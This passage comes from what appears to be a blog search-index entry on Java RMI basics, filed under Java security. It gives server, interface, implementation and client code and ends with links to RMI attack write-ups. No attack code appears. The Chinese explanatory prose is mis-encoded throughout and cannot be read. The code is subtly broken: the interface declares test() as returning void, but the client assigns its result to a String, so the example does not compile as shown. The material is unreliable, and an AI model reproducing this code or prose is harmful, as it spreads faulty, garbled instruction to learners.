ä¸­ï¼Œåœ¨8989ç«¯å£èµ·äº†RMIæœåŠ¡ï¼Œä»¥é”®å€¼å¯¹çš„å½¢å¼å­˜å‚¨äº†RMI_PATHå’ŒrmiInterfaceçš„å¯¹åº”å…³ç³»ï¼Œä¹Ÿå°±æ˜¯rmi:&#x2F;&#x2F;127.0.0.1:8989&#x2F;helloå¯¹åº”ä¸€ä¸ªServicetestImplç±»å®ä¾‹ï¼Œç„¶åé€šè¿‡Naming.rebind(RMI_NAME, rmiInterface)ç»‘å®šå¯¹åº”å…³ç³»ã€‚å†æ¥çœ‹Servicetest.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Servicetest</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å®šä¹‰äº†RMIInterfaceæ¥å£ï¼Œç»§æ‰¿è‡ªRemoteï¼Œç„¶åå®šä¹‰äº†ä¸€ä¸ªtest()æ–¹æ³•ä½œä¸ºæ¥å£ã€‚æ³¨æ„éœ€è¦æŠ›å‡ºRemoteExceptionå¼‚å¸¸ã€‚ç»§ç»­çœ‹å®ç°çœŸæ­£åŠŸèƒ½çš„ç±»ServicetestImpl.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLOutput;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ServicetestImpl</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">Servicetest</span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">ServicetestImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;this is a rmi test&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç»§æ‰¿è‡ªUnicastRemoteObjectç±»ï¼Œå¹¶ä¸”å®ç°ä¹‹å‰å®šä¹‰çš„Servicetestæ¥å£çš„test()æ–¹æ³•ã€‚UnicastRemoteObjectç±»æä¾›äº†å¾ˆå¤šæ”¯æŒRMIçš„æ–¹æ³•ï¼Œå…·ä½“æ¥è¯´ï¼Œè¿™äº›æ–¹æ³•å¯ä»¥é€šè¿‡JRMPåè®®å¯¼å‡ºä¸€ä¸ªè¿œç¨‹å¯¹è±¡çš„å¼•ç”¨ï¼Œå¹¶é€šè¿‡åŠ¨æ€ä»£ç†æ„å»ºä¸€ä¸ªå¯ä»¥å’Œè¿œç¨‹å¯¹è±¡äº¤äº’çš„Stubå¯¹è±¡ã€‚ç°åœ¨å°±å®šä¹‰å¥½äº†Serverç«¯ï¼Œæ¥çœ‹Client</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> com.rmi.RmiServer.RMI_NAME;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RmiClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// è·å–æœåŠ¡æ³¨å†Œå™¨</span></span><br><span class="line">            <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">8989</span>);</span><br><span class="line">            <span class="comment">// è·å–æ‰€æœ‰æ³¨å†Œçš„æœåŠ¡</span></span><br><span class="line">            String[] list = registry.list();</span><br><span class="line">            <span class="keyword">for</span> (String i : list) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;å·²ç»æ³¨å†Œçš„æœåŠ¡ï¼š&quot;</span> + i);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// å¯»æ‰¾RMI_NAMEå¯¹åº”çš„RMIå®ä¾‹</span></span><br><span class="line">            <span class="type">Servicetest</span> <span class="variable">rt</span> <span class="operator">=</span> (Servicetest) Naming.lookup(RMI_NAME);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// è°ƒç”¨Serverçš„test()æ–¹æ³•,å¹¶æ‹¿åˆ°è¿”å›å€¼.</span></span><br><span class="line">             <span class="type">String</span> <span class="variable">resultr</span> <span class="operator">=</span> rt.test();</span><br><span class="line">             System.out.println(resultr);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å‚è€ƒï¼š<a href="https://su18.org/post/rmi-attack/#2-%E6%94%BB%E5%87%BB-registry-%E7%AB%AF">https://su18.org/post/rmi-attack/#2-%E6%94%BB%E5%87%BB-registry-%E7%AB%AF</a></p><p><a href="https://paper.seebug.org/1091/#java-rmi_2">https://paper.seebug.org/1091/#java-rmi_2</a></p><p><a href="https://xz.aliyun.com/t/7079?time__1311=n4+xnD0Dy7itGQNKGNnmAzti=DkW3DB7in1oD">https://xz.aliyun.com/t/7079?time__1311&#x3D;n4%2BxnD0Dy7itGQNKGNnmAzti%3DDkW3DB7in1oD</a></p><p><a href="https://xz.aliyun.com/t/7264?time__1311=n4+xnD0Dy7G=BxGqGNnmADR7DgDfErrx3+BbD#toc-0">https://xz.aliyun.com/t/7264?time__1311&#x3D;n4%2BxnD0Dy7G%3DBxGqGNnmADR7DgDfErrx3%2BBbD#toc-0</a></p><p><a href="https://su18.org/post/rmi-attack/#2-%E6%94%BB%E5%87%BB-registry-%E7%AB%AF">https://y4er.com/posts/java-rmi/</a></p><p><a href="https://www.javasec.org/javase/RMI/">https://www.javasec.org/javase/RMI/</a></p><p><a href="http://www.mi1k7ea.com/2019/09/01/Java-RMI%E5%8E%9F%E7%90%86%E4%B8%8E%E4%BD%BF%E7%94%A8/">http://www.mi1k7ea.com/2019/09/01/Java-RMI%E5%8E%9F%E7%90%86%E4%B8%8E%E4%BD%BF%E7%94%A8/</a></p><p><a href="https://xz.aliyun.com/t/9261">https://xz.aliyun.com/t/9261</a></p><p><a href="https://www.cnblogs.com/nice0e3/p/14280278.html">https://www.cnblogs.com/nice0e3/p/14280278.html</a></p><p><a href="https://www.bilibili.com/video/BV1L3411a7ax?p=5&vd_source=82398f68c82cb90e0d9aa4fea90e36a0">https://www.bilibili.com/video/BV1L3411a7ax?p=5&vd_source&#x3D;82398f68c82cb90e0d9aa4fea90e36a0</a></p><p><a href="https://townmacro.cn/2022/04/18/java-%E5%AE%89%E5%85%A8-rmi%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/">https://townmacro.cn/2022/04/18/java-%E5%AE%89%E5%85%A8-rmi%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/</a></p><p><a href="https://su18.org/post/rmi-attack/#%E5%9B%9B-%E6%94%BB%E5%87%BB-rmi">https://su18.org/post/rmi-attack/#%E5%9B%9B-%E6%94%BB%E5%87%BB-rmi</a></p><p><a href="https://xz.aliyun.com/t/7079?time__1311=n4+xnD0Dy7itGQNKGNnmAzKDtf=4AKDkWe6YeD">https://xz.aliyun.com/t/7079?time__1311&#x3D;n4%2BxnD0Dy7itGQNKGNnmAzKDtf%3D4AKDkWe6YeD</a></p><p><a href="https://paper.seebug.org/1091/#java-rmi_2">https://paper.seebug.org/1091/#java-rmi_2</a></p><p><a href="https://forum.butian.net/share/2278">https://forum.butian.net/share/2278</a></p><p><a href="https://xz.aliyun.com/t/7264?time__1311=n4+xnD0Dy7G=BxGqGNnmADR7DgDfErrx3+BbD#toc-2">https://xz.aliyun.com/t/7264?time__1311&#x3D;n4%2BxnD0Dy7G%3DBxGqGNnmADR7DgDfErrx3%2BBbD#toc-2</a></p><p><a href="https://townmacro.cn/2022/04/18/java-%E5%AE%89%E5%85%A8-rmi%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/">https://townmacro.cn/2022/04/18/java-%E5%AE%89%E5%85%A8-rmi%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/</a></p><p><a href="https://lalajun.github.io/2020/06/22/RMI%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%B7%B1%E5%85%A5-%E4%B8%8B/#%E5%89%8D%E8%A8%80">https://lalajun.github.io/2020/06/22/RMI%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%B7%B1%E5%85%A5-%E4%B8%8B/#%E5%89%8D%E8%A8%80</a></p>]]></content>
      
      
      <categories>
          
          <category> Javaå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaåŸºç¡€ </tag>
            
            <tag> RMI </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
